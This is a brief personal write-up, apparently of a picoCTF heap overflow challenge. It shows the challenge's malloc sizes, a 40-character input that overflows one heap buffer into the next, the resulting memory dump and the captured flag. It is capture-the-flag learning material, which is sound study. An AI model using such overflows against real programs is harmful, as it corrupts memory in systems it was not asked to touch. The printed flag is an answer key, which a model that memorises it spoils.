---
created: 2024-06-15T20:50
updated: 2024-06-15T20:55
---

```cpp
#define INPUT_DATA_SIZE 5
#define SAFE_VAR_SIZE 5
input_data = malloc(INPUT_DATA_SIZE);
safe_var = malloc(SAFE_VAR_SIZE);
```

Naïve attempt to overflow will... oh it worked.

```
Enter your choice: 2
Data for buffer: 0123456789012345678901234567890123456789

+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x5e89e4f682b0  ->   0123456789012345678901234567890123456789
+-------------+----------------+
[*]   0x5e89e4f682d0  ->   23456789
+-------------+----------------+
```

I guess even heaps are connected.

```flag
picoCTF{my_first_heap_overflow_4fa6dd49}
```
